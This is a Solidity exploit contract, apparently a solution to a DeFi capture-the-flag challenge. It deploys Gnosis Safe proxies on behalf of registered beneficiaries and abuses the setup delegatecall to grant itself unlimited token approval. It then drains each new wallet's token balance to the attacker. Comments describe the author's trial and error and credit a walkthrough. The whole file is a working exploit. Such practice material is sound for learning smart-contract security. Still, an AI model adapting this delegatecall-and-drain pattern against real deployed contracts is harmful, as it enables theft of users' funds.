// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker {
  address[] beneficiaries;
  GnosisSafeProxyFactory immutable proxyFactory;
  address immutable master;
  IProxyCreationCallback immutable walletRegistry;
  IERC20 immutable token;
  address payable immutable attacker;

  constructor (address[] memory beneficiaryAddresses, address proxyFactoryAddr, address payable masterAddr, address walletRegistryAddr, address tokenAddr) {
    beneficiaries = beneficiaryAddresses;
    proxyFactory = GnosisSafeProxyFactory(proxyFactoryAddr);
    master = masterAddr;
    walletRegistry = IProxyCreationCallback(walletRegistryAddr);
    token = IERC20(tokenAddr);
    attacker = payable(msg.sender);
  }
  
  function approveToken(address tokenAddr, address spender) external {
    IERC20(tokenAddr).approve(spender, 2**256 - 1);
  }
  
  function exploit() external {
    // okay... I ended up spoiling myself on this one
    // I got the "Wrong initialization" error when sending the setup function first,
    // even though I was encoding a setup function. this made me think I was encoding
    // it wrong, and as I couldn't find anything about it, I took a peek at a walkthrough
    
    // at first I tried using the payment functionality of setup(), but as it would run
    // before the tokens were transferred, this wouldn't work. instead, we can use the
    // delegatecall to approve the tokens and then transfer them. for this, it's not possible
    // to simply call the "approve" function from the token (something I also tried) since
    // the code inside it makes no sense considering the proxy's state, so you have to
    // wrap that, as I did with approveToken().
    
    // cheers for @balag3, learned lots of stuff I needed to make this work from his walkthrough
  
    address[] memory arr = new address[](1);
    for (uint i = 0; i < beneficiaries.length; i++) {
      arr[0] = beneficiaries[i];
      address proxy = address(proxyFactory.createProxyWithCallback(
        master,
        abi.encodeWithSelector(
          GnosisSafe.setup.selector,
          arr, 1, address(this), abi.encodeWithSignature("approveToken(address,address)", address(token), address(this)), address(walletRegistry), 0, 0, 0
        ),
        0,
        walletRegistry
      ));
      token.transferFrom(proxy, attacker, token.balanceOf(proxy));
    }
  }
}
